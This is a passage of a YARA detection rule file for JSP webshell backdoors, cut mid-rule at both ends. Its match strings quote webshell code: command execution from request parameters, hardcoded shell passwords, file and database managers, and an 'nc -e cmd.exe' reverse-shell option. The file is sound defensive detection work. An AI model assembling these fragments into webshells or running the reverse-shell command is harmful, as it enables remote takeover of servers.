        $s17 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s18 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\">&nbsp;8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-ser" fullword ascii
        $s19 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s20 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_6dd02cccd06d2f442958c0aabdd100260a1c1304
{
    meta:
        description = "jsp - file 6dd02cccd06d2f442958c0aabdd100260a1c1304.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
    strings:
        $s1 = "private static final String PW = \"admin\"; //password" fullword ascii
        $s2 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//&#38169;&#35823;&#20449;&#246" ascii
        $s3 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//&#38169;&#35823;&#20449;&#246" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_3b05dd031fdbebfa79614b0035c47052ac60b210
{
    meta:
        description = "jsp - file 3b05dd031fdbebfa79614b0035c47052ac60b210.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f4a0353cab22847ddfe6a2f875cb941e5e4dd78c3eadc33d0bc9f2a38bccf606"
    strings:
        $s1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
        $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
        $s3 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
        $s4 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();" fullword ascii
        $s5 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
        $s6 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
        $s7 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
        $s8 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s9 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
        $s10 = "String s = request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
        $s11 = "BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));" fullword ascii
        $s12 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
        $s13 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
        $s14 = "String Z = EC(request.getParameter(Pwd) + \"\");" fullword ascii
        $s15 = "sb.append(r.getObject(i)+\"\" + \"\\t|\\t\");" fullword ascii
        $s16 = "BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));" fullword ascii
        $s17 = "while ((n = is.read(b)) != -1) {" fullword ascii
        $s18 = "return new String(s.getBytes(\"ISO-8859-1\"),cs);" fullword ascii
        $s19 = "void FF(String s, HttpServletResponse r) throws Exception {" fullword ascii
        $s20 = "bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")!=-1?p.trim():p+q.substring(q.in" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule ed2aa0d6782cc43cbd36dbad1f74ebc6de698f71
{
    meta:
        description = "jsp - file ed2aa0d6782cc43cbd36dbad1f74ebc6de698f71.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d1e94af7dffb2b452b826ac0d61a92710c63ce5528cf3abf2a966ef725105f27"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \"+request.getHeader(\"e1044\"));" fullword ascii
        $s2 = "if (request.getHeader(\"e1044\") != null) {" fullword ascii
        $s3 = "InputStream in = p.getInputStream();" fullword ascii
        $s4 = "OutputStream os = p.getOutputStream();" fullword ascii
        $s5 = "<%@ page import=\"java.util.*,java.io.*\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_48972f48f93f1cbdb0e4b95753da97ffdb58168f
{
    meta:
        description = "jsp - file 48972f48f93f1cbdb0e4b95753da97ffdb58168f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
    strings:
        $s1 = "UploadFile.uploadFile(request.getInputStream(), PAGE_ENCODING,Integer.parseInt(request.getHeader(\"Content-Length\")),path);" fullword ascii
        $s2 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+toPath+\"'});</script>\");" fullword ascii
        $s3 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+path+\"'});</script>\");" fullword ascii
        $s4 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+ppath+\"'});</script>\");" fullword ascii
        $s5 = "private static final String checkNewVersion = \"http://www.shack2.org/soft/javamanage/Getnewversion.jsp\";//" fullword ascii
        $s6 = "<form action=\"<%=shellPath %>?m=Login&do=DoLogin\" method=\"post\"" fullword ascii
        $s7 = "webRootPath = Util.formatPath(this.getClass().getClassLoader().getResource(\"/\").getPath());" fullword ascii
        $s8 = "p = Runtime.getRuntime().exec(cmds);" fullword ascii
        $s9 = "response.sendRedirect(shellPath+\"?m=Login&info=false\");" fullword ascii
        $s10 = "post('<%=shellPath%>',{'m':'FileManage','do':'newFile','path':currentDir,'isDir':isDir,'fileName':name});" fullword ascii
        $s11 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s12 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'downFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s13 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=Util.formatPath(cf.getPath())%>'})\">" fullword ascii
        $s14 = "Object obj=dbo.execute(runmysql);" fullword ascii
        $s15 = "String isLogin=session.getAttribute(\"isLogin\")+\"\";" fullword ascii
        $s16 = "final String shellPath=request.getContextPath()+request.getServletPath();" fullword ascii
        $s17 = "192.168.11.11 |Java WebManage coded by shack2" fullword ascii
        $s18 = "Object o = dbo.execute(runmysql);" fullword ascii
        $s19 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\"+fname);" fullword ascii
        $s20 = "href=\"javascript:post('<%=shellPath%>',{m:'FileManage',do:'delete',path:'<%=currentPath%>'})\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_2a0ffc23374ef902dfb87bd3a5454b9a96e0d0be
{
    meta:
        description = "jsp - file 2a0ffc23374ef902dfb87bd3a5454b9a96e0d0be.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4b79fa18eb10450915e5bcaca1bf2c156771e72714c6dc41c2cd1cc31ef5d668"
    strings:
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();" fullword ascii
        $s2 = "if(\"023\".equals(request.getParameter(\"pwd\"))){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_7cefe48970e53d5451f0c01ac7feee0a91956805
{
    meta:
        description = "jsp - file 7cefe48970e53d5451f0c01ac7feee0a91956805.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5367ccc084e49042cad9d9726ed868b300c1d470588e727330116c0f8b96dea5"
    strings:
        $x1 = "String Pwd=\"023\";String EC(String s,String c)throws Exception{return s;}Connection GC(String s)throws Exception{String[] x=s.t" ascii
        $x2 = "String cs=request.getParameter(\"z0\")+\"\";request.setCharacterEncoding(cs);response.setContentType(\"text/html;charset=\"+cs);" ascii
        $s3 = "ng(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(" ascii
        $s4 = "nt(1005,1007);ResultSet r=m.executeQuery(\"select * from \"+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i<=d.getColumn" ascii
        $s5 = "fferedWriter bw = null;try {ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSet" ascii
        $s6 = "MM(InputStream is, StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));wh" fullword ascii
        $s7 = "++) {if(q.indexOf(\"--f:\")!=-1){bw.write(EC(r.getString(i), cs)+\"\\t\");bw.flush();}else{sb.append(EC(r.getString(i), cs) + \"" ascii
        $s8 = "String cs=request.getParameter(\"z0\")+\"\";request.setCharacterEncoding(cs);response.setContentType(\"text/html;charset=\"+cs);" ascii
        $s9 = "xecuteUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");} catch (Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n" ascii
        $s10 = "mm:ss\");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s, String d)throws Exception{URL u=new UR" ascii
        $s11 = "Data d = r.getMetaData();int n = d.getColumnCount();for (int i = 1; i <= n; i++) {sb.append(d.getColumnName(i) + \"\\t|\\t\");}s" ascii
        $s12 = ",cs);StringBuffer sb=new StringBuffer(\"\");try{sb.append(\"->\"+\"|\");String s = request.getSession().getServletContext().getR" ascii
        $s13 = "Files();for(int k=0;k<x.length;k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)" ascii
        $s14 = "fferedInputStream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n" ascii
        $s15 = "=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void" ascii
        $s16 = "m().split(\"\\r\\n\");Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length" ascii
        $s17 = "tFiles();String sT, sQ,sF=\"\";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0;i" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8ce89e73d9ef2d3c53a2eb829f790c5878b5e6f5
{
    meta:
        description = "jsp - file 8ce89e73d9ef2d3c53a2eb829f790c5878b5e6f5.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c13a5ec3d790bd79fd182c877b03092f4a80d9de9ea7487444a39b1dd52fc7e1"
    strings:
        $s1 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
        $s2 = "private static final String PW = \"xuying\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule dd8294851aee7c3615461c60fdaefc4145140f34
{
    meta:
        description = "jsp - file dd8294851aee7c3615461c60fdaefc4145140f34.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e9fcd44d77864312ec51f14a203046844e5c32a5
{
    meta:
        description = "jsp - file e9fcd44d77864312ec51f14a203046844e5c32a5.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
    strings:
        $s1 = "private static final String PW = \"mmym\"; //password" fullword ascii
        $s2 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_3e1cd375612c3bde5c4f01bb1839c41a442bca15
{
    meta:
        description = "jsp - file 3e1cd375612c3bde5c4f01bb1839c41a442bca15.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a7dfeaedd16e6338e1db155de166500dfb8371622e9c21f0aea09040ccfe8579"
    strings:
        $s1 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + file.getName() + \"\\\";filename*=UTF-" fullword ascii
        $s2 = "public Shell(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, ServletC" fullword ascii
        $s3 = "page.modules = $().add(page.loginDialog).add(page.fileTable);" fullword ascii
        $s4 = "tryTime.find('.times').text(parseInt(result.data[\"max-try\"]) - parseInt(result.data['try-time']));" fullword ascii
        $s5 = "return request.getMethod().toUpperCase().equals(\"POST\") && \"login-form\".equals(request.getParameter(\"form-name\"));" fullword ascii
        $s6 = "page.logoutLink.text('Logout ' + result.data['username']);" fullword ascii
        $s7 = "fileInfo.put(\"download_url\", getUrl(\"download\", file.getAbsolutePath()));" fullword ascii
        $s8 = "return blockUtil == null ? 0 : (int) (Math.max(0, blockUtil - System.currentTimeMillis()) / 1000);" fullword ascii
        $s9 = "<script src=\"https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js\"></script>" fullword ascii
        $s10 = "<script src=\"https://cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script>" fullword ascii
        $s11 = "<script src=\"https://cdn.bootcss.com/jquery.form/3.51/jquery.form.min.js\"></script>" fullword ascii
        $s12 = "<script src=\"https://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js\"></script>" fullword ascii
        $s13 = "<link href=\"https://cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\" rel=\"stylesheet\"/>" fullword ascii
        $s14 = "<script src=\"https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script>" fullword ascii
        $s15 = "public boolean onService(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, " fullword ascii
        $s16 = "result.data = page.processDataXML(result.dataElement);" fullword ascii
        $s17 = "$(document).on('click', 'table.table tr.type-file a.btn-view, table.table tr.type-file a.btn-download', function (e) {" fullword ascii
        $s18 = "<input type=\"submit\" name=\"login-submit\" id=\"login-submit\" tabindex=\"3\"" fullword ascii
        $s19 = "page.loginDialog = $('#login-dialog');" fullword ascii
        $s20 = "data.put(\"breadcrumb\", getBreadCrumb(data.get(\"pwd\").toString()));" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule e45e1180934fae287e6843e9e38666fe29b4ac76
{
    meta:
        description = "jsp - file e45e1180934fae287e6843e9e38666fe29b4ac76.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "31ce3b5fd44d13657926e93308d43fe0ef6c58559e50ba3029c6f97b35517f99"
    strings:
        $s1 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
        $s2 = "result = renameFile(curPath, request.getRequestURI() + \"?action=\" + action, Unicode2GB(file2Rename), Unicode2GB(newNam" fullword ascii
        $s3 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
        $s4 = "ame() + \"\\\">&lt;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s5 = "sRet += \"   <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s6 = "e() + \"\\\">\" + pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s7 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
        $s8 = "sRet += \"   <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s9 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
        $s10 = "private String _password = \"520520\";" fullword ascii
        $s11 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseName=" ascii
        $s12 = "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpc" fullword ascii
        $s13 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";" ascii
        $s14 = "les[n].getPath()) + \"\\\" /></td>\\n\";" fullword ascii
        $s15 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
        $s16 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s17 = "sRet = (new String(str.getBytes(), 0, len, \"utf8\")) + \"...\";" fullword ascii
        $s18 = "+ \"&fsAction=open\" + \"\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s19 = "sRet = \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=\" + curUri + \"&curPath=\" + path + fileName + \"&fsAction=open\" +" ascii
        $s20 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8576d13e8cd8a824068ffc151d86d591b87a6637
{
    meta:
        description = "jsp - file 8576d13e8cd8a824068ffc151d86d591b87a6637.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e51a2ac2c8026a4a860fe29e0d84e8e258bc2a8516e464860890caf3b3a291a2"
    strings:
        $s1 = "interp.exec(command);" fullword ascii
        $s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword ascii
        $s3 = "frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);" fullword ascii
        $s4 = "public JythonShell(PyObject dict, PySystemState systemState, int columns, int rows, int scrollback) {" fullword ascii
        $s5 = "command += space + line + \"\\n\";" fullword ascii
        $s6 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword ascii
        $s7 = "private Color colorError = new Color(187, 0, 0);" fullword ascii
        $s8 = "frame.add(console, BorderLayout.CENTER);" fullword ascii
        $s9 = "console.setTextAttributes(new TextAttributes(colorError));" fullword ascii
        $s10 = "private Color colorForeground = new Color(187, 187, 187);" fullword ascii
        $s11 = "this(dict, systemState, DEFAULT_COLUMNS, DEFAULT_ROWS, DEFAULT_SCROLLBACK);" fullword ascii
        $s12 = "this(dict, Py.getSystemState());" fullword ascii
        $s13 = "public JythonShell(int columns, int rows, int scrollback) {" fullword ascii
        $s14 = "this(null, Py.getSystemState());" fullword ascii
        $s15 = "public JythonShell(PyObject dict, PySystemState systemState) {" fullword ascii
        $s16 = "private Color colorCursor = new Color(187, 187, 0);" fullword ascii
        $s17 = "private Color colorBackground = new Color(0, 0, 0);" fullword ascii
        $s18 = "String command = \"\";" fullword ascii
        $s19 = "console.setTextAttributes(new TextAttributes(colorCursor));" fullword ascii
        $s20 = "console.run();" fullword ascii
    condition:
        ( uint16(0) == 0x6170 and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule cca3ee71414b8c58dc3abd3bd59dbcf44a60d957
{
    meta:
        description = "jsp - file cca3ee71414b8c58dc3abd3bd59dbcf44a60d957.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b5c412b1cd5a2e66e66396b91d6a8e61b073bca7cca9204cfba02284421fc427"
    strings:
        $x1 = "<%@page pageEncoding=\"utf-8\"%><%@page import=\"java.io.*\"%><%@page import=\"java.util.*\"%><%@page import=\"java.util.regex.*" ascii
        $x2 = "==null)program=\"cmd.exe /c net start>\"+SHELL_DIR+\"/Log.txt\";if(JSession.getAttribute(MSG)!=null){Util.outMsg(out,JSession.ge" ascii
        $x3 = "command\");String program=request.getParameter(\"program\");if(cmd==null){if(ISLINUX)cmd=\"id\";else cmd=\"cmd.exe /c set\";}if(" ascii
        $s4 = "Util.isEmpty(command)){Process pro=Runtime.getRuntime().exec(command);BufferedReader reader=new BufferedReader(new InputStreamRe" ascii
        $s5 = "value=\\\"\"+(ISLINUX?\"/bin/bash\":\"c:\\\\windows\\\\system32\\\\cmd.exe\")+\"\\\"/><input type=\\\"hidden\\\" name=\\\"o\\\" " ascii
        $s6 = "s.put(\"vConn\",new VConnInvoker());ins.put(\"dbc\",new DbcInvoker());ins.put(\"executesql\",new ExecuteSQLInvoker());ins.put(\"" ascii
        $s7 = ".getAttribute(SHELL_ONLINE);if(online!=null)((OnLineProcess)online).stop();JSession.invalidate();((Invoker)ins.get(\"vLogin\"))." ascii
        $s8 = "bject obj=((DBOperator)dbo).execute(sql);if(obj instanceof ResultSet){ResultSet rs=(ResultSet)obj;ResultSetMetaData meta=rs.getM" ascii
        $s9 = "ram=request.getParameter(\"program\");if(!Util.isEmpty(program)){Process pro=Runtime.getRuntime().exec(program);JSession.setAttr" ascii
        $s10 = "ByteArrayOutputStream();UploadBean upload=new UploadBean();upload.setTargetOutput(stream);upload.parseRequest(request);if(strea" fullword ascii
        $s11 = "(request,response,session);return;}else{((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);return;}}%><%!private st" ascii
        $s12 = "request,HttpServletResponse response,HttpSession JSession)throws Exception{try{PrintWriter out=response.getWriter();out.println" fullword ascii
        $s13 = "n><option value=\\\"nc-e cmd.exe 192.168.230.1 4444\\\">nc</option><option value=\\\"lcx-slave 192.168.230.1 4444 127.0.0.1 3389" ascii
        $s14 = "DefaultInvoker{public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession)throws Exception" fullword ascii
        $s15 = "d connect()throws Exception{this.conn=DriverManager.getConnection(url,uid,pwd);}public Object execute(String sql)throws Exceptio" ascii
        $s16 = "s=Runtime.getRuntime().exec(program);(new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();(new Strea" ascii
        $s17 = "\");if(Util.isEmpty(exe))return;Process pro=Runtime.getRuntime().exec(exe);ByteArrayOutputStream outs=new ByteArrayOutputStream(" ascii
        $s18 = "p){this.pro=p;}public void setPro(Process p){this.pro=p;}public void setCmd(String c){this.cmd=c;}public String getCmd(){return " ascii
        $s19 = "\"javascript:doPost({o:'vConn'});\\\">DataBase Manager</a> | <a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | " ascii
        $s20 = "t.toString()))port=\"53\";if(Util.isEmpty(program)){if(ISLINUX)program=\"/bin/bash\";else program=\"cmd.exe\";}if(!Util.isEmpty(" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_0469aa92db9d69692fef21d502f879a7b2566718
{
    meta:
        description = "jsp - file 0469aa92db9d69692fef21d502f879a7b2566718.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6d6c6abcfc5025864b2be74e533c641ce8a00ec8afb6b1e11cd0d191e653e008"
    strings:
        $s1 = "<a href=\"?path=<%String tempfilepath1=request.getParameter(\"path\"); if(tempfilepath!=null) path=tempfilepath;%><%=path%>&" fullword ascii
        $s2 = "cmd = (String)request.getParameter(\"command\");result = exeCmd(cmd);%>" fullword ascii
        $s3 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword ascii
        $s4 = "<input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"button\" /> " fullword ascii
        $s5 = "if (password == null && session.getAttribute(\"password\") == null) {" fullword ascii
        $s6 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.library.path\").replaceAll(env.queryHashtable(\"path.sep" fullword ascii
        $s7 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.io.tmpdir\")%></td>" fullword ascii
        $s8 = "<td width=\"20%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.runtime.version\")%></td>" fullword ascii
        $s9 = "<td height=\"22\" colspan=\"3\">&nbsp;<%= request.getServerName() %>(<%=request.getRemoteAddr()%>)</td>" fullword ascii
        $s10 = "<a href=\"<%=selfName %>?path=<%=path%><%=fList[j].getName()%>\\\"> <%=fList[j].getName()%></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii
        $s11 = "String password=request.getParameter(\"password\");" fullword ascii
        $s12 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword ascii
        $s13 = "//if(request.getQueryString()!=null&&request.getQueryString().indexOf(act,0)>=0)action=request.getParameter(act);" fullword ascii
        $s14 = "tempfilename=(String)session.getId();" fullword ascii
        $s15 = "<textarea name=\"content\" cols=\"105\" rows=\"30\"><%=readAllFile(editfile)%></textarea>" fullword ascii
        $s16 = "<td colspan=\"3\">&nbsp;<%=env.queryHashtable(\"os.name\")%> <%=env.queryHashtable(\"os.version\")%> " fullword ascii
        $s17 = "{editfilecontent=new String(editfilecontent1.getBytes(\"ISO8859_1\"));}" fullword ascii
        $s18 = "* <p>Company: zero.cnbct.org</p>" fullword ascii
        $s19 = "//String tempfilename=request.getParameter(\"file\");" fullword ascii
        $s20 = "String editfilecontent1=request.getParameter(\"content\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule sig_41cf3b413baf202a88541419419e3cd7ea9ab999
{
    meta:
        description = "jsp - file 41cf3b413baf202a88541419419e3cd7ea9ab999.jsp"
        company = "WatcherLab"
        level = 4
